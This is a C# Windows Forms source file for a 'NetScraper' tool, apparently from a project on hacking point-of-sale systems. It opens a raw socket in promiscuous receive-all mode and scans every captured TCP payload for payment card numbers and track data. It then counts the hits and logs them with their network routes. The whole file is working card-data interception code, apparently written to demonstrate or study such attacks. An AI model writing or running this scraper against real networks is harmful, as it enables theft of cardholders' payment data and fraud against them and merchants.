using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Reflection;
using HackingPOS.Scrapers.Common;

namespace HackingPOS.Scrapers.NetScraper
{
    public partial class NetScraperForm : Form
    {
        private Socket socket;                          
        private byte[] dataBuffer = new byte[4096];
        private bool inProgress = false;            
        private delegate void SetLabelText(Label label);

        List<SearchResult> res = null;
        PANandTracksSearch searchLine = new PANandTracksSearch(false);

        int cardsFound = 0;
        int packetCounter = 0;
        string listeningAddress = string.Empty;

        DateTime startDateTime; 
        
        public NetScraperForm()
        {
            InitializeComponent();
        }

        private void buttonStart_Click(object sender, EventArgs e)
        {
            if (Addresses.Text == "")
                return;
    
            try
            {
                    buttonStart.Enabled = false;
                    buttonStop.Enabled = true;
                    buttonLog.Enabled = false;

                    startDateTime = DateTime.Now;
                                    
                    cardsFound = 0;
                    packetCounter = 0;
                    listeningAddress = Addresses.Text;

                    labelCardsFound.Text = cardsFound.ToString();
                    labelPacketCounter.Text = packetCounter.ToString();
                    labelLastPacket.Text = "None";

                    res = new List<SearchResult>();
                
                    inProgress = true;

                    socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
                    socket.Bind(new IPEndPoint(IPAddress.Parse(listeningAddress), 0));
                    socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true); 

                    byte[] In = new byte[4] {1, 0, 0, 0};
                    byte[] Out = new byte[4]{1, 0, 0, 0}; 

                    socket.IOControl(IOControlCode.ReceiveAll, In, Out);

                    socket.BeginReceive(dataBuffer, 0, dataBuffer.Length, SocketFlags.None, new AsyncCallback(OnDataReceived), null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NetScraper", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }



        private void OnDataReceived(IAsyncResult ar)
        {
            try
            {
                int ReceivedCount = socket.EndReceive(ar);
                DecodeData(dataBuffer, ReceivedCount);

                if (inProgress)     
                {
                    dataBuffer = new byte[4096];
                    socket.BeginReceive(dataBuffer, 0, dataBuffer.Length, SocketFlags.None, new AsyncCallback(OnDataReceived), null);
                }
            }
            catch (ObjectDisposedException)
            {
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NetScraper", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }            
        }

        private void DecodeData(byte[] dataBuffer, int dataLength)
        {
            IPHeader ipHeader = new IPHeader(dataBuffer, dataLength);

            if (ipHeader.ProtocolID == BaseHeader.PROTOCOL_TCP)
            {
                    TCPHeader tcpHeader = new TCPHeader(ipHeader.Payload, ipHeader.PayloadLength);

                    string ASCIItext = Encoding.ASCII.GetString(ipHeader.Payload);
                    string Unicodetext = Encoding.Unicode.GetString(ipHeader.Payload);
                    
                    string route = ipHeader.SourceAddress + ":" + tcpHeader.SourcePort + " - " + ipHeader.DestinationAddress + ":" + tcpHeader.DestinationPort;

                    searchLine.Search(ASCIItext, route, "", ref res);
                    searchLine.Search(Unicodetext, route, "", ref res);

                    if (res.Count > cardsFound)
                    {
                        cardsFound = res.Count;
                        LabelText(labelCardsFound, "Text", cardsFound.ToString());
                    }

                    packetCounter++;
                    LabelText(labelPacketCounter, "Text", packetCounter.ToString());
                    LabelText(labelLastPacket, "Text", route);
                  
            }
        }

        private delegate void SetLabelTextDelegate(Control control, string propertyName, object propertyValue);

        public static void LabelText(Control control, string propertyName, object propertyValue)
        {
            if (control.InvokeRequired)
            {
                control.Invoke(new SetLabelTextDelegate(LabelText), new object[] { control, propertyName, propertyValue });
            }
            else
            {
                control.GetType().InvokeMember(propertyName, BindingFlags.SetProperty, null, control, new object[] { propertyValue });
            }
        }

        private void NetScraperForm_Load(object sender, EventArgs e)
        {
            IPHostEntry addressList = Dns.GetHostEntry((Dns.GetHostName()));
            if (addressList.AddressList.Length > 0)
            {
                foreach (IPAddress address in addressList.AddressList)
                {
                    string theAddress = address.ToString();
                    if (theAddress.Length < 16)
                        Addresses.Items.Add(address.ToString());
                }
            }
            if (Addresses.Items.Count > 0)
                Addresses.Text = Addresses.Items[0].ToString();
        }

        private void NetScraperForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (inProgress)
            {
                socket.Close();
            }
        }

        private void buttonStop_Click(object sender, EventArgs e)
        {
            try
            {
                socket.Close();
            }
            catch
            { }

            buttonStart.Enabled = true;
            buttonStop.Enabled = false;
            buttonLog.Enabled = true;
            inProgress = false;

            ScanInfo scanInfo = new ScanInfo();
            scanInfo.searchResults = res;
            scanInfo.TotalCardCount = res.Count;
            scanInfo.searchInfo = "IP Address: " + listeningAddress;
            scanInfo.processedFilesCount = packetCounter;
            scanInfo.startDateTime = startDateTime;
            scanInfo.stopDateTime = DateTime.Now;
            scanInfo.scanDuration = (scanInfo.stopDateTime - scanInfo.startDateTime).ToString();
            Logger.GetLogger(LogType.NetScraper).AddToLog(scanInfo);
        }

        private void buttonLog_Click(object sender, EventArgs e)
        {
            Logger.GetLogger(LogType.MemoryScraper).ShowLogFile();
        }
    }
}